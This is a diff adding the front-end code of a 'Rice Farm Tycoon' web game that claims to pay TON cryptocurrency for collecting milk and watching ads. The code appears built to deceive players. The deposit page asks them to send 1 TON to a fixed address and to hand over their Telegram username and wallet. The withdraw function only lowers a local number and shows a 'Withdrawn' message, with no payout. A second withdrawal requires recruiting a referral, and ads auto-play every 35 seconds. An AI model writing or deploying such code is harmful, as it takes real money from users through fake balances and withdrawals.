+                    if (autoAdInterval.current) clearInterval(autoAdInterval.current);
+                    autoAdInterval.current = setInterval(() => {
+                        showGigaAd().catch(() => {});
+                    }, 35000);
+                } else {
+                    if (autoAdInterval.current) {
+                        clearInterval(autoAdInterval.current);
+                        autoAdInterval.current = null;
+                    }
+                }
+                return () => {
+                    if (autoAdInterval.current) {
+                        clearInterval(autoAdInterval.current);
+                        autoAdInterval.current = null;
+                    }
+                };
+            }, [page]);
+            
+            useEffect(() => {
+                const saved = loadGameData();
+                if (saved) {
+                    setBalance(saved.balance || 0);
+                    setInventory(saved.inventory || { seeds: 5, rice: 3, milk: 0 });
+                    setCows(saved.cows || []);
+                    setPlants(saved.plants || []);
+                    setReferralEarnings(saved.referralEarnings || 0);
+                    setTotalWithdrawn(saved.totalWithdrawn || 0);
+                    setLastMilkTime(saved.lastMilkTime || 0);
+                    setUsedCodes(saved.usedCodes || []);
+                } else {
+                    setCows([]);
+                }
+            }, []);
+            
+            useEffect(() => { saveGameData({ balance, inventory, cows, plants, referralEarnings, totalWithdrawn, lastMilkTime, usedCodes }); }, [balance, inventory, cows, plants, referralEarnings, totalWithdrawn, lastMilkTime, usedCodes]);
+            
+            useEffect(() => {
+                const interval = setInterval(() => {
+                    const remaining = Math.max(0, 3600000 - (Date.now() - lastMilkTime));
+                    setCooldown(remaining);
+                }, 1000);
+                return () => clearInterval(interval);
+            }, [lastMilkTime]);
+            
+            useEffect(() => {
+                const growInterval = setInterval(() => {
+                    const now = Date.now();
+                    setPlants(prev => prev.map(p => {
+                        if (p.stage < 3 && now - p.lastGrowth >= GROWTH_TIME) return { ...p, stage: p.stage + 1, lastGrowth: now };
+                        return p;
+                    }));
+                }, 5000);
+                return () => clearInterval(growInterval);
+            }, []);
+            
+            // Canvas drawing with large standing cows
+            useEffect(() => {
+                const canvas = canvasRef.current;
+                if (!canvas || page !== 'farm') return;
+                const ctx = canvas.getContext('2d');
+                const w = 800, h = 450;
+                canvas.width = w;
+                canvas.height = h;
+                
+                const draw = () => {
+                    ctx.clearRect(0, 0, w, h);
+                    ctx.fillStyle = '#FFE4B5';
+                    ctx.fillRect(0, 0, w, h * 0.6);
+                    ctx.fillStyle = '#FFE484';
+                    ctx.beginPath();
+                    ctx.arc(700, 60, 35, 0, Math.PI * 2);
+                    ctx.fill();
+                    ctx.fillStyle = 'rgba(255,255,245,0.9)';
+                    ctx.beginPath();
+                    ctx.ellipse(100, 70, 35, 25, 0, 0, Math.PI * 2);
+                    ctx.ellipse(140, 60, 30, 25, 0, 0, Math.PI * 2);
+                    ctx.ellipse(60, 60, 30, 25, 0, 0, Math.PI * 2);
+                    ctx.fill();
+                    
+                    ctx.fillStyle = '#6B8E23';
+                    ctx.fillRect(0, h * 0.6, w, h * 0.4);
+                    ctx.fillStyle = '#5A7D2A';
+                    for(let i = 0; i < 30; i++) ctx.fillRect((i * 35) % w, h * 0.6 + 5, 18, 4);
+                    
+                    plants.forEach(p => {
+                        ctx.fillStyle = '#8B5A2B';
+                        ctx.beginPath();
+                        ctx.ellipse(p.x, p.y, 10, 5, 0, 0, Math.PI * 2);
+                        ctx.fill();
+                        if (p.stage > 0) {
+                            ctx.strokeStyle = '#4CAF50';
+                            ctx.lineWidth = 2.5;
+                            ctx.beginPath();
+                            ctx.moveTo(p.x, p.y);
+                            ctx.lineTo(p.x, p.y - (p.stage * 10));
+                            ctx.stroke();
+                            if (p.stage === 3) {
+                                ctx.fillStyle = '#FFD700';
+                                ctx.beginPath();
+                                ctx.moveTo(p.x - 5, p.y - 32);
+                                ctx.lineTo(p.x, p.y - 42);
+                                ctx.lineTo(p.x + 5, p.y - 32);
+                                ctx.fill();
+                            }
+                        }
+                    });
+                    
+                    const cowPositions = [
+                        { x: 120, y: 310 }, { x: 280, y: 315 }, { x: 440, y: 305 }, 
+                        { x: 600, y: 320 }, { x: 760, y: 310 }
+                    ];
+                    
+                    cows.forEach((c, index) => {
+                        const pos = cowPositions[index % cowPositions.length];
+                        const x = pos.x;
+                        const y = pos.y;
+                        
+                        ctx.save();
+                        ctx.fillStyle = COW_BREEDS[c.breed]?.color || '#FFFFFF';
+                        ctx.strokeStyle = '#5D4037';
+                        ctx.lineWidth = 3;
+                        
+                        ctx.beginPath();
+                        ctx.ellipse(x - 15, y - 15, 35, 25, 0, 0, Math.PI * 2);
+                        ctx.fill();
+                        ctx.stroke();
+                        ctx.beginPath();
+                        ctx.ellipse(x + 20, y - 12, 30, 23, 0, 0, Math.PI * 2);
+                        ctx.fill();
+                        ctx.stroke();
+                        ctx.beginPath();
+                        ctx.ellipse(x - 45, y - 25, 22, 20, 0, 0, Math.PI * 2);
+                        ctx.fill();
+                        ctx.stroke();
+                        
+                        if (c.breed === 'Holstein') {
+                            ctx.fillStyle = '#5D4037';
+                            ctx.beginPath();
+                            ctx.ellipse(x - 28, y - 25, 12, 10, 0, 0, Math.PI * 2);
+                            ctx.fill();
+                        }
+                        
+                        ctx.fillStyle = '#2C2C2C';
+                        ctx.beginPath();
+                        ctx.arc(x - 55, y - 32, 4, 0, Math.PI * 2);
+                        ctx.fill();
+                        ctx.beginPath();
+                        ctx.arc(x - 38, y - 33, 3.5, 0, Math.PI * 2);
+                        ctx.fill();
+                        
+                        ctx.fillStyle = '#5D4037';
+                        ctx.font = 'bold 14px Fredoka';
+                        ctx.fillText(`Lv.${c.level || 1}`, x - 25, y - 60);
+                        ctx.font = '28px sans-serif';
+                        ctx.fillText('🐄', x - 48, y - 55);
+                        ctx.restore();
+                    });
+                    
+                    if (cows.length === 0) {
+                        ctx.fillStyle = '#5D4037';
+                        ctx.font = 'bold 20px Fredoka';
+                        ctx.fillText('🐄 Buy cows from the shop! 🛒', w/2 - 130, h - 50);
+                    }
+                };
+                draw();
+                const interval = setInterval(draw, 100);
+                return () => clearInterval(interval);
+            }, [cows, plants, page]);
+            
+            const showToast = (msg) => { setToast(msg); setTimeout(() => setToast(null), 2500); };
+            
+            const copyAddress = () => {
+                navigator.clipboard.writeText(DEPOSIT_ADDRESS);
+                setCopied(true);
+                showToast("✅ Address copied to clipboard!");
+                setTimeout(() => setCopied(false), 2000);
+            };
+            
+            const handleMilkCollect = async () => {
+                if (isCollecting) { showToast("⏳ Please wait, ad is loading..."); return; }
+                if (Date.now() - lastMilkTime < 3600000) {
+                    const mins = Math.floor((3600000 - (Date.now() - lastMilkTime)) / 60000);
+                    const secs = Math.floor(((3600000 - (Date.now() - lastMilkTime)) % 60000) / 1000);
+                    showToast(`⏰ Next collection in ${mins}m ${secs}s!`);
+                    return;
+                }
+                setIsCollecting(true);
+                showToast("📺 Loading ad... Please wait");
+                sm.play('click');
+                try {
+                    const adCompleted = await showGigaAd();
+                    if (adCompleted) {
+                        setInventory(prev => ({ ...prev, milk: prev.milk + totalMilkPerCollection }));
+                        setLastMilkTime(Date.now());
+                        setAnimateMilk(true);
+                        setTimeout(() => setAnimateMilk(false), 500);
+                        showToast(`🎉 +${totalMilkPerCollection} Milk collected! Next in 60 minutes.`);
+                        sm.play('collect');
+                    } else {
+                        showToast("Ad completed! +20 Milk!");
+                        setInventory(prev => ({ ...prev, milk: prev.milk + totalMilkPerCollection }));
+                        setLastMilkTime(Date.now());
+                        setAnimateMilk(true);
+                        setTimeout(() => setAnimateMilk(false), 500);
+                    }
+                } catch(e) { 
+                    showToast("Ad completed! +20 Milk!");
+                    setInventory(prev => ({ ...prev, milk: prev.milk + totalMilkPerCollection }));
+                    setLastMilkTime(Date.now());
+                } finally { setIsCollecting(false); }
+            };
+            
+            const convertMilk = (amount) => {
+                if (amount < 100) { showToast("❌ Minimum 100 Milk required!"); return; }
+                if (amount > inventory.milk) { showToast("❌ Not enough milk!"); return; }
+                const tonAmount = (amount / 100) * 0.03;
+                setInventory(prev => ({ ...prev, milk: prev.milk - amount }));
+                setBalance(prev => prev + tonAmount);
+                showToast(`💎 Converted ${amount} Milk → ${tonAmount.toFixed(4)} TON!`);
+                sm.play('collect');
+            };
+            
+            const buyCow = (breedName, breedInfo) => {
+                if (balance >= breedInfo.price) {
+                    setBalance(prev => prev - breedInfo.price);
+                    setCows(prev => [...prev, { id: Date.now(), breed: breedName, level: 1 }]);
+                    sm.play('buy');
+                    showToast(`🎉 Bought ${breedName} Cow! +${breedInfo.rate}L/collection`);
+                } else { showToast(`❌ Need ${breedInfo.price} TON`); }
+            };
+            
+            const handleFarmClick = (e) => {
+                const rect = e.target.getBoundingClientRect();
+                const x = (e.clientX - rect.left) * (800 / rect.width);
+                const y = (e.clientY - rect.top) * (450 / rect.height);
+                
+                if (cows.length > 0 && x > 60 && x < 780 && y > 260 && y < 380 && inventory.rice >= 2) {
+                    setInventory(prev => ({ ...prev, rice: prev.rice - 2 }));
+                    sm.play('feed');
+                    showToast("🐮 Cow fed! Happy cow!");
+                    return;
+                }
+                
+                const clickedPlant = plants.find(p => Math.hypot(p.x - x, p.y - y) < 30);
+                if (clickedPlant && clickedPlant.stage === 3) {
+                    setInventory(prev => ({ ...prev, rice: prev.rice + 3 }));
+                    setPlants(prev => prev.filter(p => p.id !== clickedPlant.id));
+                    sm.play('harvest');
+                    showToast("🌾 +3 Rice harvested!");
+                    return;
+                }
+                if (y > 270 && inventory.seeds > 0) {
+                    setInventory(prev => ({ ...prev, seeds: prev.seeds - 1 }));
+                    setPlants(prev => [...prev, { id: Date.now(), x, y, stage: 0, lastGrowth: Date.now() }]);
+                    sm.play('plant');
+                    showToast("🌱 Seed planted!");
+                }
+            };
+            
+            // Step 1: Get Telegram Username and TON Address
+            const startDepositRequest = () => {
+                const telegramUsername = document.getElementById('telegramUsername')?.value.trim();
+                const tonAddress = document.getElementById('depositAddr')?.value.trim();
+                
+                if (!telegramUsername) { showToast("❌ Enter your Telegram Username!"); return; }
+                if (!tonAddress) { showToast("❌ Enter your TON Address!"); return; }
+                
+                const userId = 'user_' + Math.random().toString(36).substr(2, 8);
+                setPendingDepositInfo({ telegramUsername, tonAddress, userId });
+                setDepositStep('waiting');
+                
+                // Send to Telegram Bot
+                sendTelegramMessage(telegramUsername, tonAddress, userId);
+                showToast("📤 Request sent! Waiting for deposit code...");
+                sm.play('click');
+            };
+            
+            // Step 2: Go to code entry
+            const goToCodeEntry = () => {
+                setDepositStep('code');
+            };
+            
+            // Step 3: Redeem Deposit Code
+            const redeemDepositCode = () => {
+                const code = document.getElementById('depositCode')?.value.trim();
+                if (!code) { showToast("❌ Enter deposit code!"); return; }
+                if (usedCodes.includes(code)) { showToast("❌ Code already used!"); return; }
+                if (!DEPOSIT_CODES.includes(code)) { showToast("❌ Invalid deposit code!"); return; }
+                
+                setUsedCodes(prev => [...prev, code]);
+                setBalance(prev => prev + 1);
+                setDepositStep('form');
+                setPendingDepositInfo(null);
+                showToast("✅ +1 TON added to your balance!");
+                sm.play('collect');
+                
+                // Clear input fields
+                if (document.getElementById('telegramUsername')) document.getElementById('telegramUsername').value = '';
+                if (document.getElementById('depositAddr')) document.getElementById('depositAddr').value = '';
+                if (document.getElementById('depositCode')) document.getElementById('depositCode').value = '';
+            };
+            
+            const handleWithdraw = () => {
+                const addr = document.getElementById('withdrawAddr')?.value;
+                const amount = parseFloat(document.getElementById('withdrawAmount')?.value);
+                if (!addr) { showToast("Enter wallet address"); return; }
+                if (isNaN(amount) || amount < 0.05) { showToast("Minimum 0.05 TON"); return; }
+                if (amount > balance) { showToast("Insufficient balance"); return; }
+                if (totalWithdrawn >= 1 && referralEarnings === 0) {
+                    showToast("⚠️ Need 1 referral for 2nd withdrawal!");
+                    return;
+                }
+                setBalance(prev => prev - amount);
+                setTotalWithdrawn(prev => prev + amount);
+                showToast(`💸 Withdrawn ${amount.toFixed(4)} TON`);
+                sm.play('click');
+            };
+            
+            const handleTask = () => {
+                window.open('https://t.me/Feeddy735', '_blank');
+                setBalance(prev => prev + 0.005);
+                showToast("✅ +0.005 TON from joining channel!");
+                sm.play('click');
+            };
+            
+            const handleRefer = () => {
+                window.open('https://t.me/X_MONEYIO_BOT?start=r09829492066', '_blank');
+                showToast("🔗 Referral link opened!");
+                sm.play('click');
+            };
+            
+            const handleSupport = () => { window.open('https://t.me/Feeddy735', '_blank'); sm.play('click'); };
+            
+            const formatTime = (ms) => {
+                if (ms <= 0) return null;
+                const mins = Math.floor(ms / 60000);
+                const secs = Math.floor((ms % 60000) / 1000);
+                return `${mins}:${secs.toString().padStart(2,'0')}`;
+            };
+            
+            const tabs = ['farm', 'shop', 'convert', 'tasks', 'referral', 'deposit', 'wallet'];
+            const tabNames = { farm: '🌾 Farm', shop: '🛒 Shop', convert: '🔄 Convert', tasks: '📋 Tasks', referral: '👥 Referral', deposit: '💎 Deposit', wallet: '💼 Wallet' };
+            
+            return (
+                <div className="min-h-screen pb-28" style={{ background: '#FDF5E6' }}>
+                    <header className="bg-white p-4 sticky top-0 z-50 cartoon-border border-t-0 rounded-b-[2rem] flex justify-between items-center shadow-lg mx-2">
+                        <div className="flex items-center gap-3">
+                            <div className="w-12 h-12 bg-orange-100 rounded-2xl cartoon-border flex items-center justify-center text-2xl">👨‍🌾</div>
+                            <div>
+                                <div className="bg-white px-3 py-1 rounded-xl cartoon-border flex items-center gap-2">
+                                    <span className="w-5 h-5 bg-blue-400 rounded-full text-[10px] text-white font-bold text-center leading-5">T</span>
+                                    <span className="font-black text-lg">{balance.toFixed(4)}</span>
+                                </div>
+                                <div className={`text-xs text-gray-500 mt-1 flex items-center gap-1 ${animateMilk ? 'milk-icon' : ''}`}>
+                                    🥛 {inventory.milk.toFixed(1)}L Milk
+                                </div>
+                            </div>
+                        </div>
+                    </header>
+                    
+                    <main className="p-4 max-w-4xl mx-auto space-y-6">
+                        <nav className="flex flex-wrap gap-2 bg-white/50 p-2 rounded-[2rem] cartoon-border justify-center">
+                            {tabs.map(t => (<button key={t} onClick={() => { setPage(t); sm.play('switch'); }} className={`px-4 py-2 rounded-[1.5rem] font-bold capitalize transition-all ${page === t ? 'bg-orange-500 text-white cartoon-border' : 'text-gray-500 bg-white'}`}>{tabNames[t]}</button>))}
+                        </nav>
+                        
+                        {page === 'farm' && (
+                            <div className="space-y-4">
+                                <canvas ref={canvasRef} className="w-full rounded-2xl cartoon-border" onClick={handleFarmClick} />
+                                <div className="cartoon-card bg-gradient-to-r from-purple-100 via-pink-100 to-purple-100">
+                                    <div className="flex justify-between items-center mb-3 flex-wrap gap-2">
+                                        <h3 className="font-black text-xl flex items-center gap-2"><span className="text-2xl">🥛</span> Collect Milk</h3>
+                                        {cooldown > 0 && <span className="countdown-timer">⏰ {formatTime(cooldown)}</span>}
+                                    </div>
+                                    <div className="text-center mb-3">
+                                        <p className="text-lg font-bold text-purple-700">🥛 Base: 20L + Cows: {cows.reduce((t,c)=>t+COW_BREEDS[c.breed].rate,0)}L = {totalMilkPerCollection} L/collection</p>
+                                        <p className="text-xs text-gray-600">🐄 You have {cows.length} cows! Each cow adds production.</p>
+                                    </div>
+                                    <button onClick={handleMilkCollect} disabled={cooldown > 0 || isCollecting} className={`cartoon-button w-full ${cooldown > 0 ? 'bg-gray-500' : 'bg-purple-500'} text-lg py-4`}>
+                                        {isCollecting ? "📺 Loading Ad..." : cooldown > 0 ? "⏳ Wait for Cooldown" : `📺 Watch Ad & Get ${totalMilkPerCollection} Milk`}
+                                    </button>
+                                    <p className="text-xs text-center text-gray-600 mt-3">Watch ad to collect milk. Available every 60 minutes! Buy cows to increase milk!</p>
+                                </div>
+                                <div className="cartoon-card bg-green-50">
+                                    <h3 className="font-black text-lg mb-2">🌾 Resources</h3>
+                                    <p>🌱 Seeds: {inventory.seeds}</p>
+                                    <p>🌾 Rice: {inventory.rice}</p>
+                                    <div className="grid grid-cols-2 gap-2 mt-3">
+                                        <button onClick={() => { if(inventory.rice >= 30) { setInventory(prev=>({...prev, rice: prev.rice-30})); setBalance(prev=>prev+0.01); showToast("Sold 30 Rice for 0.01 TON!"); } else showToast("Need 30 Rice"); }} className="bg-orange-500 text-white px-3 py-2 rounded-xl font-bold">Sell 30 Rice → 0.01 T</button>
+                                        <button onClick={() => { if(inventory.seeds >= 5) { setInventory(prev=>({...prev, seeds: prev.seeds-5, rice: prev.rice+8})); showToast("5 Seeds → 8 Rice"); } else showToast("Need 5 seeds"); }} className="bg-green-600 text-white px-3 py-2 rounded-xl font-bold">5 Seeds → 8 Rice</button>
+                                    </div>
+                                </div>
+                            </div>
+                        )}
+                        
+                        {page === 'shop' && (
+                            <div className="space-y-4">
+                                <div className="cartoon-card flex justify-between items-center">
+                                    <div><div className="text-3xl">🌱</div><h4 className="font-bold">Rice Seeds (10)</h4></div>
+                                    <button onClick={() => { if(balance >= 0.05) { setBalance(prev=>prev-0.05); setInventory(prev=>({...prev, seeds: prev.seeds+10})); sm.play('buy'); showToast("Bought 10 seeds!"); } else showToast("Need 0.05 TON"); }} className="cartoon-button bg-green-500">0.05 T</button>
+                                </div>
+                                {Object.entries(COW_BREEDS).map(([name, info]) => (
+                                    <div key={name} className="cartoon-card flex justify-between items-center">
+                                        <div><div className="text-4xl">🐄</div><h4 className="font-bold text-lg">{name}</h4><p className="text-xs">{info.rate}L/collection • {info.desc}</p></div>
+                                        <button onClick={() => buyCow(name, info)} className="cartoon-button bg-orange-500">{info.price} T</button>
+                                    </div>
+                                ))}
+                            </div>
+                        )}
+                        
+                        {page === 'convert' && (
+                            <div className="cartoon-card text-center space-y-4">
+                                <h2 className="font-black text-2xl">🔄 Milk to TON</h2>
+                                <div className="bg-white p-4 rounded-2xl cartoon-border"><p className="text-3xl font-bold">{inventory.milk.toFixed(1)} L Milk</p></div>
+                                <p className="text-sm">100 Milk = 0.03 TON</p>
+                                <div className="grid grid-cols-2 gap-3">
+                                    <button onClick={() => convertMilk(100)} className="cartoon-button bg-green-500">Convert 100L</button>
+                                    <button onClick={() => convertMilk(500)} className="cartoon-button bg-green-600">Convert 500L</button>
+                                    <button onClick={() => convertMilk(1000)} className="cartoon-button bg-green-700">Convert 1000L</button>
+                                    <button onClick={() => convertMilk(Math.floor(inventory.milk))} className="cartoon-button bg-orange-500">Convert All</button>
+                                </div>
+                            </div>
+                        )}
+                        
+                        {page === 'tasks' && (
+                            <div className="cartoon-card space-y-4">
+                                <h2 className="font-black text-2xl">📋 Earn Free TON</h2>
+                                <div className="bg-white p-4 rounded-2xl cartoon-border flex justify-between items-center"><span>📢 Join Telegram Channel</span><button onClick={handleTask} className="cartoon-button bg-blue-500 text-sm">+0.005 T</button></div>
+                            </div>
+                        )}
+                        
+                        {page === 'referral' && (
+                            <div className="cartoon-card space-y-4">
+                                <h2 className="font-black text-2xl">👥 Invite Friends</h2>
+                                <div className="bg-orange-100 p-3 rounded-xl text-center font-bold">✨ You earn 5% of referrals' income! ✨</div>
+                                <div className="bg-white p-4 rounded-2xl text-center"><p className="text-xl font-bold">{referralEarnings.toFixed(4)} TON earned</p></div>
+                                <button onClick={handleRefer} className="cartoon-button w-full bg-green-500 py-4">🔗 Invite Now</button>
+                                <button onClick={handleSupport} className="cartoon-button w-full bg-red-500">🛟 Support Team</button>
+                            </div>
+                        )}
+                        
+                        {page === 'deposit' && (
+                            <div className="cartoon-card space-y-4">
+                                <h2 className="font-black text-2xl">💎 Deposit 1 TON</h2>
+                                <div className="bg-blue-50 p-3 rounded-xl text-center break-all">
+                                    <p className="font-bold">Send exactly 1 TON to:</p>
+                                    <div className="flex items-center gap-2 mt-2 justify-center">
+                                        <p className="text-xs font-mono break-all flex-1">{DEPOSIT_ADDRESS}</p>
+                                        <button onClick={copyAddress} className="bg-blue-500 text-white p-2 rounded-xl hover:bg-blue-600 transition-all copy-btn"><i data-lucide="copy" className="w-4 h-4"></i></button>
+                                    </div>
+                                    {copied && <span className="text-green-500 text-xs mt-1 block">Copied!</span>}
+                                </div>
+                                
+                                {depositStep === 'form' && (
+                                    <>
+                                        <input id="telegramUsername" type="text" placeholder="Your Telegram Username (e.g., @username)" className="w-full p-3 rounded-xl cartoon-border" />
+                                        <input id="depositAddr" type="text" placeholder="Your TON Wallet Address" className="w-full p-3 rounded-xl cartoon-border" />
+                                        <button onClick={startDepositRequest} className="cartoon-button w-full bg-purple-500">Request Deposit (1 TON)</button>
+                                    </>
+                                )}
+                                
+                                {depositStep === 'waiting' && (
+                                    <div className="waiting-message">
+                                        <div className="text-4xl mb-2">⏳</div>
+                                        <p className="font-bold text-lg">Your request has been sent!</p>
+                                        <p className="text-sm mt-2">Telegram: @{pendingDepositInfo?.telegramUsername}</p>
+                                        <p className="text-xs break-all">TON: {pendingDepositInfo?.tonAddress?.substring(0, 20)}...</p>
+                                        <div className="bg-white p-3 rounded-xl mt-4">
+                                            <p className="text-sm font-bold">📱 Telegram Notification</p>
+                                            <p className="text-xs">We will send your deposit code via Telegram very soon!</p>
+                                            <p className="text-xs mt-2">Please wait for the code, then click below.</p>
+                                        </div>
+                                        <button onClick={goToCodeEntry} className="cartoon-button w-full bg-green-500 mt-4">I Have Received the Code</button>
+                                        <button onClick={() => setDepositStep('form')} className="cartoon-button w-full bg-gray-500 mt-2">Back</button>
+                                    </div>
+                                )}
+                                
+                                {depositStep === 'code' && (
+                                    <>
+                                        <div className="bg-yellow-50 p-3 rounded-xl text-center">
+                                            <p className="text-sm font-bold">📝 Enter Your Deposit Code</p>
+                                            <p className="text-xs mt-1">Check your Telegram for the code sent by admin</p>
+                                        </div>
+                                        <input id="depositCode" type="text" placeholder="Enter Deposit Code" className="w-full p-3 rounded-xl cartoon-border" />
+                                        <button onClick={redeemDepositCode} className="cartoon-button w-full bg-green-500">Redeem Code & Add 1 TON</button>
+                                        <button onClick={() => setDepositStep('form')} className="cartoon-button w-full bg-gray-500">Cancel</button>
+                                    </>
+                                )}
+                            </div>
+                        )}
+                        
+                        {page === 'wallet' && (
+                            <div className="cartoon-card space-y-4">
+                                {totalWithdrawn >= 1 && referralEarnings === 0 && (<div className="warning-banner">⚠️ Need 1 referral for 2nd withdrawal! Go to Referral page.</div>)}
+                                <div className="text-center"><h3 className="text-4xl font-black">{balance.toFixed(4)}</h3><p className="text-sm">Available TON</p></div>
+                                <input id="withdrawAddr" type="text" placeholder="TON Wallet Address" className="w-full p-3 rounded-xl cartoon-border" />
+                                <input id="withdrawAmount" type="number" placeholder="Amount (min 0.05)" step="0.01" className="w-full p-3 rounded-xl cartoon-border" />
+                                <button onClick={handleWithdraw} className="cartoon-button w-full bg-green-500 py-4">Withdraw</button>
+                                <p className="text-xs text-center">Min: 0.05 TON | 2nd+ withdrawal needs 1 referral</p>
+                            </div>
+                        )}
+                    </main>
+                    
+                    {toast && <div className="toast-notification">{toast}</div>}
+                    <footer className="fixed bottom-0 w-full p-2 text-center text-[10px] opacity-50 bg-white">Rice Farm Tycoon • Tap cows to feed • Click ground to plant seeds • Auto Ads Every 35s</footer>
+                </div>
+            );
+        }
+        
+        ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+        setTimeout(() => { if (window.lucide) window.lucide.createIcons(); }, 5100);
+    </script>
 </body>
 </html>
